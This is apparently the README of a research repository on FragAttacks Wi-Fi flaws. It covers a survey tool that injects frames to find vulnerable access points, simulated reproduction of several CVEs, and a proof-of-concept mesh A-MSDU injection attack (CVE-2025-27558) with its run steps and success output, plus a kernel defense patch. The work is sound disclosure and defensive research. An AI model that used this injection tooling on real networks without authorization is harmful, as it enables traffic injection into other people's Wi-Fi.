# Fragile Frames: Wi-Fi’s Fraught Fight Against FragAttacks

This repository contains the code and some of the data used in the paper *Fragile Frames: Wi-Fi’s Fraught Fight Against FragAttacks*. The code was utilized for conducting Wi-Fi surveys, analyzing the data collected during the surveys, and for bypassing and improving the _Spoofing A-MSDU_ defense in mesh networks (CVE-2025-27558).

<a id="toc"></a>
## 1. Table of Contents

- [1. Table of Concents](#toc)
- [2. FragAttack Survey](#survey)
	- [2.1. Prerequisites](#survey-prerequisites)
	- [2.2. Usage of the Code](#survey-usage)
	- [2.3. Other Remarks](#survey-other)
- [3. Simulated Experiments](#simulations)
	- [3.1. Patched Drivers and Code](#simul-drivers-code)
	- [3.2. Simulated Survey Tests](#simul-survey)
	- [3.3. Simulated Mesh Attack and Defense](#simul-mesh)
- [4. Mesh A-MSDU Attack and Defense Details](#mesh-details)
	- [4.1. Vulnerability Details: CVE-2025-27558](#mesh-vulnerability)
	- [4.2. Defense Proof-of-Concept](#mesh-defense)	 
- [5. Appendix: Detailed Data](#appendix)
	- [5.1. Cities and ISP Analysis](#appendix-cities-isp)
	- [5.2. Vendor Analysis](#appendix-vendors)

<a id="survey"></a>
## 2. FragAttack Survey

<a id="survey-prerequisites"></a>
### 2.1. Prerequisites

To conduct the Wi-Fi surveys, a PC running the Python scripts and two Wi-Fi dongles are necessary.

The Python scripts are built upon the 'fragattacks' repository by Mathy Vanhoef. Ensure that all [preconditions described in that repository are met](https://github.com/vanhoefm/fragattacks?tab=readme-ov-file#3-prerequisites) before running the script. In particular, ensure to use the patched FragAttack drivers are used, or that a recent kernel is used that by-default includes the needed [driver injection patches](https://github.com/vanhoefm/wifi-injection). This is necessary, because (older) drivers may otherwise overwrite fields of injected frames, in particular the fragment number field, causing some of our test to no longer work.

<a id="survey-usage"></a>
### 2.2. Usage of the Code

First install the appropriate Python virtual environment:

	python3 -m venv venv
	source venv/bin/activate
	pip install -r requirements.txt

Then inside `main.py`, modify the four global parameters `dongle*_inf` and `dongle*_mac` with the name of the wireless network card and MAC address of the Wi-Fi dongles to use, respectively.

Now load the created python virtual environment as root and execute the scanning script:

	sudo su
	source venv/bin/activate
	python3 main.py

The core functionality of the code is in `main.py`, which relies on `tests.py` for functions that construct Wi-Fi frames used in the tests. Since surveys may need to be conducted in segments due to factors like battery limitations or device disconnections, the collected data must be merged before analysis. This can be done using the `combine.py` script.

The `analyse.py` file contains code for analyzing the data. This file creates an `analysis.txt` file that provides insights into the collected data.

Before running the scripts, you must specify the names and addresses of the Wi-Fi dongles in the `main.py` file.

If everything is configured properly, the code will have output as follows:

![Example output of the survey tool](./example.png)

<a id="survey-other"></a>
### 2.3. Other Remarks

- During our survey, we also captured beacon and probe responses to afterwards be able to query for network properties. This can be done using the command `sudo tcpdump -ni wlan3 -w capture.pcap "wlan[0] == 0x50 || wlan[0] == 0x8`.
- Among other things, we inspected the beacon and probe responses for SSP A-MSDU support. This support be advertised in the RSN and/or RSNX element. The files [`spp_amsdu_rsn.pcapng`](spp_amsdu_rsn.pcapng) and [`spp_amsdu_rsnx.pcapng`](spp_amsdu_rsnx.pcapng) contain examples of this, respectively.
	- Support advertised in the RSNX element can be detected using the filter `(wlan.rsn.capabilities & 0x0400) != 0`.
	- Support advertised in the RSNX element can be detected using the filter `wlan.rsnx.spp_amsdu_capable == True`.


<a id="simulations"></a>
## 3. Simulated Experiments

<a id="simul-drivers-code"></a>
### 3.1. Patched Drivers and Code

First install all dependencies. This was tested on Ubuntu 20.04 LTS:

	sudo apt install bison flex linux-headers-$(uname -r) \
		libnl-3-dev libnl-genl-3-dev libnl-route-3-dev libssl-dev \
		libdbus-1-dev git pkg-config build-essential macchanger net-tools \
		python3-venv python3-scapy

**Now disable Wi-Fi in your network manager.** Otherwise, the kernel will crash when loading the modified drivers below (due to issues with WEXT).

To simulate all experiments,  we used virtualized Wi-Fi network cards, and modified Wi-Fi drivers to simulate vulnerable networks. We first need to build these tools and drivers, and then install the modified drivers:

	./build_all.sh
	cd linux-driver-backports-6.1.110
	sudo make install
	# reboot after installing modified drivers

Note that `./build_all.sh` only compiles the virtual `mac80211_hwsim` driver that we used in our experiments. If you also want to test other networks cards, then use another defconfig file such as `defconfig-wifi` in `./build_all.sh` which will compile all backported wireless drivers.


<a id="simul-survey"></a>
### 3.2. Simulated Survey Tests

We created patched Linux kernel modules to create a Wi-Fi network that is vulnerable to the 5 surveyed FragAttack CVEs. Note that we did not test for CVE-2020-26145 in our survey (see Section 3.2) and hence we also do not simulate it here. All combined, this means our virtual setup can reproduce the Plaintext Full frame injection (CVE-2020-26140), Fragmented Plaintext frame injection (CVE-2020-26143), EAPOL Forward (CVE-2020-26139), and Spoofing A-MSDUs (CVE-2020-24588). If you are interested in how these vulnerabilities are reproduced, see [commit d9783f2](https://github.com/vanhoefm/fragattacks-survey-public/commit/d9783f2e5d920919fcd7058e721372bb5008c82f).

You can reproduce the detection of the above 5 vulnerabilities by opening a terminal and then executing the following five scripts:

1. In the first terminal, execute `./start_hwsim.sh`. This creates a virtual Wi-Fi setup.
2. In the second terminal, execute `./start_ap.sh`. This starts the vulnerable access point.
3. In the third terminal, execute `./start_client.sh`. This starts a client that connects to the access point.
4. In the fourth terminal, execute `sudo ./gentraffic.py`. This simulates legitimate network traffic.
5. In the fifth terminal, execute the following:

	```
	sudo su
	source venv/bin/activate
	python3 main.py
	```

The tool should now output in green each of the following lines at least once:

	PLAINTEXT BROADCAST PACKET CAPTURED: Plain. full (CVE-2020-26140)
	PLAINTEXT BROADCAST PACKET CAPTURED: Plain. frag. (CVE-2020-26143)
	FORWARDED PACKET CAPTURED: EAPOL forward (CVE-2020-26139)
	BROADCAST PACKET CAPTURED: Fake EAPOL (CVE-2020-26144)
	ENTERPRISE: Spoof. A-MSDU (CVE-2020-24588)

When one of these lines is printed, it means the network was detected as affected by this vulnerability. Due to sensitivity to frame transmission timing, you might have to execute `python3 main.py` several times before all vulnerabilities are rediscovered (at most 10 in our tests).

Note: optionally, you can also provide an argument to `./start_hwsim.sh [plain-full, plain-frag, eapol-forward, spoof-amsdu, fake-eapol]` to only simulate a single vulnerability in each run.


<a id="simul-mesh"></a>
### 3.3. Simulated Mesh Attack and Defense

The directory `hostap-mesh-poc` contains our proof-of-concept attack against mesh networks, which performs the _Spoofing A-MSDU_ attack against a mesh client. Note that we patched `wpa_supplicant` so our python script can easily access the negotiated session keys used by a mesh client, which enables us to more easily verify that an attack succeeded.

You can reproduce the mesh attack by executing the following three scripts (close all other scripts first):

1. In the first terminal, execute `./start_hwsim.sh mesh-attack`. This creates a virtual Wi-Fi setup with the existing A-MSDU defenses enabled.
2. In the second terminal, execute `./start_mesh1.sh`. This starts the victim mesh client.
3. In the third terminal, execute the following:

	```
	cd fragattacks-survey-public/hostap-mesh-poc/research
	sudo su
	source venv/bin/activate
	./client.py wlan1 wlan2
	```

This python script has as first argument the network interface of the victim, and as second argument the network interface of the attacker. This allows the script to monitor the network interface of the victim to automatically detect whether the _Spoofing A-MSDU_ attack successfully injected a packet.

The following output will be shown if the attack succeeded:

	...
	wlan2: Control interface command 'GET tk'wlan2: Control interface command 'GET tk'
	CTRL_IFACE GET 'tk'
	CTRL-DEBUG: ctrl_sock-sendto: sock=13 sndbuf=212992 outq=0 send_len=32
	>>> Got key 1af69c3678d775cfb6f5faf78ff9e0b2
	RTM_NEWLINK: ifi_index=4 ifname=wlan1 operstate=6 linkmode=1 ifi_family=0 ifi_flags=0x11043 ([UP][RUNNING][LOWER_UP])

	>>> Sending simulated attacker IPv4 single MSDU marked but marked as A-MSDU...

	Plaintext: <Dot11  subtype=QoS Data type=Data FCfield=to-DS+from-DS addr1=02:00:00:00:00:00 (RA) addr2=02:00:00:00:01:00 (TA) addr3=02:00:00:00:00:00 (DA) SC=80 addr4=02:00:00:00:01:00 (BSSID) |<Dot11QoS  TXOP=1 |<Dot11MeshControl  ttl=31 seqnum=6002 |<LLC  dsap=0xaa ssap=0xaa ctrl=3 |<SNAP  code=IPv4 |<IP  |<Raw  load=b'\x00\x00' |<Ether  dst=02:00:00:00:00:00 src=02:00:00:00:01:00 type=0x4500 |<Dot11MeshControl  ttl=31 seqnum=6002 |<LLC  dsap=0xaa ssap=0xaa ctrl=3 |<SNAP  code=IPv4 |<IP  frag=0 proto=udp src=1.2.3.4 dst=5.6.7.8 |<UDP  |<Raw  load=b'Simulated A-MSDU attack injection' |>>>>>>>>>>>>>>
	Encrypted: <Dot11  subtype=QoS Data type=Data FCfield=to-DS+from-DS+protected addr1=02:00:00:00:00:00 (RA) addr2=02:00:00:00:01:00 (TA) addr3=02:00:00:00:00:00 (BSSID) SC=80 addr4=02:00:00:00:01:00 (BSSID) |<Dot11QoS  A_MSDU_Present=1 TXOP=1 |<Dot11CCMP  PN0=5 PN1=0 key_id=0 ext_iv=1 PN2=0 PN3=0 PN4=0 PN5=0 |<Raw  load=b'\x84\x04/\xa2LV\x9dp\x94t]h\x9f\x88_X0\xac\x93e\x89\xd2\xdfp\x94\xf7\xefT\xe6$t\xabU\xa2Vu#\xf1\xf4\xebO\x0eo\xb6\x17sBq\xb7L\xa7H\xde1\x0c\xe2K\xa74\x17S\x9e\n\x98\x96M\xee\xee\xf5P\xee5VW`\x8b\x975o\x18\xbd]\xf3\xdb}\xc7\xa6a^q\xb1]e?:.t|*k\x03\xa8\xa6P\x8bYj\xf5\xb2\xc7\xc9%\xc6}K\xf6\xe6O\xe7\xbc\\M\xc7\xab?' |<Raw  load=b'\x13\x91ex\x12\xf4\x81\xa4' |>>>>>
	RTM_NEWLINK: ifi_index=9 ifname=monwlan2 operstate=0 linkmode=0 ifi_family=0 ifi_flags=0x11043 ([UP][RUNNING][LOWER_UP])
	.
	Sent 1 packets.
	RTM_NEWLINK: ifi_index=9 ifname=monwlan2 operstate=0 linkmode=0 ifi_family=0 ifi_flags=0x11043 ([UP][RUNNING][LOWER_UP])

	>>> ATTACK WORKED! Received injected packet

	<IP  version=4 ihl=5 tos=0x0 len=61 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x6a9c src=1.2.3.4 dst=5.6.7.8 |<UDP  sport=domain dport=domain len=41 chksum=0xa671 |<DNS  id=21353 qr=0 opcode=13 aa=1 tc=0 rd=1 ra=0 z=1 ad=1 cd=1 rcode=refused qdcount=27745 ancount=29797 nscount=25632 arcount=16685 qd=[<DNSQR  qname=b'.' qtype=17493 unicastresponse=0 qclass=8289 |>, <DNSQR  qname=b'.' qtype=24931 unicastresponse=0 qclass=27424 |>, <DNSQR  qname=b'.' qtype=27237 unicastresponse=0 qclass=25460 |>, <Raw  load=b'ion' |>] |>>>


You can now re-do this experiment with our drivers that include our new mesh defense. First stop all scripts (you might have to execute CTRL+C twice to stop the mesh client) then execute:

1. In the first terminal, execute `./start_hwsim.sh mesh-defense`. This creates a virtual Wi-Fi setup.
2. In the second terminal, execute `./start_mesh1.sh`. This restarts the victim mesh client, now with our novel mesh defense.
3. In the third terminal, execute the following:

	```
	cd fragattacks-survey-public/hostap-mesh-poc/research
	sudo su
	source venv/bin/activate
	./client.py wlan1 wlan2
	```

The attack should now fail, i.e., the following output will eventually be shown:

	>> Couldn't detect injected packet. Client looks secure.

You can also manually confirm that the attack worked by running a network sniffer on the interface of the victim, which in the above examples was `wlan1`. You can also monitor the special interface `hwsim0` that displays all raw Wi-Fi frames of the virtual network cards.

The script `./client.py` also as the following paramaters that were used to confirm the correctness of our kernel patch:

- `--test-normal`: send both a normal MSDU and A-MSDU to confirm that they are still received correctly with the patch.

- `--six-addresses`: perform either the attack of the normal test using 6 addresses, i.e., with a Mesh Address Extension field of 12 bytes.


<a id="mesh-details"></a>
## 4. Mesh A-MSDU Attack and Defense Details

<a id="mesh-vulnerability"></a>
### 4.1. Vulnerability Details: CVE-2025-27558

After the disclosure of the "FragAttacks" vulnerabilities, in particular CVE-2020-24588, an update was approved to detect if a malicious outsider turned an MSDU into an A-MSDU by changing the unauthenticated A-MSDU Present subfield in the QoS Control field to 1.

When an MSDU is turned into an A-MSDU in a nonmesh BSS, this can be detected by comparing the destination address of the first A-MSDU subframe to AA:AA:03:00:00:00. The following figure illustrates this check, where the bytes shown are those of an example MSDU, the top shows how these bytes are parsed as an MSDU, and the bottom shows how these bytes are parsed as an A-MSDU:

![Layout of A-MSDU frames in non-mesh networks](./amsdu-normal.png)

This shows that when an MSDU is turned into an A-MSDU by a malicious outsider, the destination address of the first subframe in the A-MSDU will be AA:AA:03:00:00:00 which equals the first 6 bytes of the RFC1042 header (specifically an LLC header followed by a SNAP header). Based on this, the submission [On A-MSDU addressing](https://mentor.ieee.org/802.11/dcn/21/11-21-0816-03-000mon-a-msdu-addressing.docx) added a defense to drop the A-MSDU if the destination address of the first A-MSDU subframe equals AA:AA:03:00:00:00.

However, in a mesh BSS (MBSS), all MSDU frames start with a 6-byte Mesh Control field, followed by the RFC1042 header. The following figure shows example bytes of an MSDU that is sent by a mesh STA in a mesh BSS (MBSS), parsed as an MSDU (top), and when parsed as an A-MSDU (bottom):

![Layout of A-MSDU frames in mesh networks](./amsdu-mesh.png)

If parsed as an MSDU (top), the frame starts with a 6-byte Mesh Control field, where the two least significant bits of the Flags subfield indicate the length of the optional Mesh Address Extension field, shown in yellow and bold, which is either 0, 6, or 12 bytes long.

When the same bytes are parsed as an A-MSDU in a MBSS (bottom), the destination field of the first A-MSDU does not equal AA-AA-03-00-00-00-00, meaning the previously-introduced defense does not work in an MBSS. Instead, to detect the attack, when a mesh STA receives an A-MSDU, the first byte should be parsed as the Flags field, and the 6-bytes at the offset where the RFC1042 header would start has to be compared against the value AA-AA-03-00-00-00-00 to detect the attack.

The above issue in an MBSS was confirmed with wpa_supplicant 2.11 on Linux 6.12 using the mac80211_hwsim driver: under the right conditions, a malicious outsider could abuse this to inject arbitrary frames into the MBSS. This vulnerability was assigned CVE-2025-27558. A proof-of-concept of the defense proposed in this submission was implemented on Linux kernel 6.1.110 and successfully detected when a malicious outsider changed the A-MSDU Present subfield to 1.

<a id="mesh-defense"></a>
### 4.2. Defense Proof-of-Concept

The directory `linux-driver-backports-6.1.110` contains modified Linux drivers that can be configured to defend against the _Spoofing A-MSDU_ attack (CVE-2020-24588) in the context of mesh networks. It is compatible with Linux kernels 6.1 and below. To compile and install these drivers, see [3.1. Patched Drivers](#simul-drivers-code).

Specifically, the following patch prevents the attack:

	commit 884bb914b4f4829d7c5bb3ff3f874b1721effa57 (HEAD -> main)
	Author: Anonymous
	Date:   Sat Mar 8 22:21:13 2025 +0100

	    backports: prevent A-MSDU attacks in mesh networks
	    
	    This patch is a mitigation to prevent the A-MSDU vulnerability, also
	    known under CVE-2020-24588, for mesh networks. This is done by treating
	    the frame as a standard MSDU, calculating the lenght of the Mesh Control
	    header, and seeing if the 6 bytes after this header equal the start of
	    an rfc1042 header.
	    
	    This defense was tested against a network that uses an empty Mesh
	    Address Extension field, i.e., when four addresses are used.

	diff --git a/linux-driver-backports-6.1.110/net/wireless/util.c b/linux-driver-backports-6.1.110/net/wireless/util.c
	index c71b85f..6b9902f 100644
	--- a/linux-driver-backports-6.1.110/net/wireless/util.c
	+++ b/linux-driver-backports-6.1.110/net/wireless/util.c
	@@ -813,6 +813,29 @@ bool ieee80211_is_valid_amsdu(struct sk_buff *skb, bool mesh_hdr)
	 }
	 EXPORT_SYMBOL(ieee80211_is_valid_amsdu);
	 
	+static bool detect_amsdu_aggregation_attack(struct ethhdr *eth, struct sk_buff *skb, enum nl80211_iftype iftype)
	+{
	+       int offset;
	+
	+       /** Non-mesh case can be directly compared */
	+       if (iftype != NL80211_IFTYPE_MESH_POINT)
	+               return memcmp(eth->h_dest, rfc1042_header, 6) == 0;
	+
	+       offset = __ieee80211_get_mesh_hdrlen(eth->h_dest[0]);
	+       if (offset == 6) {
	+               /** Mesh case with empty address extension field */
	+               return memcmp(eth->h_source, rfc1042_header, 6) == 0;
	+       } else if (offset + 6 <= skb->len) {
	+               /** Mesh case with non-empty address extension field */
	+               uint8_t temp[6];
	+
	+               skb_copy_bits(skb, offset, temp, 6);
	+               return memcmp(temp, rfc1042_header, 6) == 0;
	+       }
	+
	+       return false;
	+}
	+
	 void ieee80211_amsdu_to_8023s(struct sk_buff *skb, struct sk_buff_head *list,
		                      const u8 *addr, enum nl80211_iftype iftype,
		                      const unsigned int extra_headroom,
	@@ -858,7 +881,7 @@ void ieee80211_amsdu_to_8023s(struct sk_buff *skb, struct sk_buff_head *list,
		        if (subframe_len > remaining)
		                goto purge;
		        /* mitigate A-MSDU aggregation injection attacks */
	-               if (ether_addr_equal(hdr.eth.h_dest, rfc1042_header))
	+               if (offset == 0 && detect_amsdu_aggregation_attack(&hdr.eth, skb, iftype))
		                goto purge;
	 
		        offset += sizeof(struct ethhdr);


<a id="appendix"></a>
## 5. Appendix: Detailed Data

<a id="appendix-cities-isp"></a>
### 5.1 Cities and ISP Analysis

Table 1 in our paper gives the percentage of vulnerable APs out of those that met the test preconditions, i.e., out of the actual tested APs. The below table contains exactly how many APs were vulnerable followed by exactly how many APs were tested. Notice that the _Plain. full_ (CVE-2020-
26140) and _Plain. frag._ (CVE-2020-26143) tests have the same preconditions.

![Example output of the survey tool](survey-detials.png)

<a id="appendix-vendors"></a>
### 5.2. Vendor Analysis

Table 3 below presents the percentage of vulnerable APs for each vendor. These percentages are calculated based only on the networks that met the preconditions for the test, for City A, B and C in 2025. Vendors with fewer than 10 tested APs are combined into the "other" group.

![Vendor survey results percentages](survey-vendors-percentages.png)

Table 4 below shows how the percentage in the above Table 3 is calculated. More precisely, this table contains the total number of vulnerable APs for each vendor, followed by the number of APs that met the preconditions for performing the test. These numbers are based on the surveys in City A, B and C in 2025. Vendors with fewer than 10 tested APs are combined into the "other" group.

![Vendor survey results absolute](survey-vendors-absolute.png)

